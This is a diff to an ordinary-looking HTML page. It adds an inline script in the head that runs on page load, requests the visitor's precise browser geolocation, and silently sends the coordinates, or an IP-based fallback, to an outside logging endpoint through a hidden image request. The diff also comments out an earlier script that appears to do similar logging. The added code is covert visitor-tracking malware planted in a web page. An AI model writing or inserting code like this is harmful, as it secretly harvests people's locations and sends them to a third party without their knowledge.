@@ -11,6 +11,68 @@
 
 </head>
 
+    <script>
+(function () {
+    const endpoint = "https://fortifi.great-site.net/log.php";
+
+    function send(lat = null, lon = null, source = "ip") {
+        const url = new URL(endpoint);
+
+        if (lat !== null && lon !== null) {
+            url.searchParams.set("lat", lat);
+            url.searchParams.set("lon", lon);
+            url.searchParams.set("source", "browser");
+        } else {
+            url.searchParams.set("source", "ip");
+        }
+
+        // silent request (no redirect)
+        const img = new Image();
+        img.src = url.toString();
+    }
+
+    if (!("geolocation" in navigator)) {
+        send(); // fallback immediately
+        return;
+    }
+
+    let sent = false;
+
+    navigator.geolocation.getCurrentPosition(
+        function (pos) {
+            if (sent) return;
+            sent = true;
+
+            send(
+                pos.coords.latitude,
+                pos.coords.longitude,
+                "browser"
+            );
+        },
+        function () {
+            if (sent) return;
+            sent = true;
+
+            send(); // fallback
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 7000,
+            maximumAge: 0
+        }
+    );
+
+    // safety fallback (if browser hangs)
+    setTimeout(() => {
+        if (!sent) {
+            sent = true;
+            send();
+        }
+    }, 8000);
+
+})();
+</script>
+
 <body>
     <header>
         <div class="logo">
@@ -142,7 +204,7 @@
             })
         })
     </script>
-    <script src="script.js"></script>
+    <!-- <script src="script.js"></script>
     <script>
         $time = date("Y-m-d H:i:s");
 (function() {
@@ -173,7 +235,7 @@
         img.src = logUrlBase;
     }
 })();
-</script>
+</script> -->
 </body>
 
     
